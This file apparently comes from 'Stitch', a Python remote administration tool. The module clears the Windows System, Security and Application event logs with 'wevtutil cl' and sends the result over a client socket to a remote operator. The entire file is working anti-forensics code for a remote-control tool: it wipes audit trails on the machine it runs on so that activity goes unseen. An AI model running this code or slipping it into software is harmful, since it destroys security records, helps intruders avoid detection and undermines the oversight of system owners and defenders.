# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import subprocess

sys_log = run_command('wevtutil cl System')
sec_log = run_command('wevtutil cl Security')
app_log = run_command('wevtutil cl Application')

summary=''
if no_error(sys_log):
    if no_error(sec_log):
        if no_error(app_log):
            send(client_socket,'[+] System, Security, and Application logs have been cleared.\n')
        else:
            send(client_socket,app_log)
    else:
        send(client_socket,sec_log)
else:
    send(client_socket,sys_log)
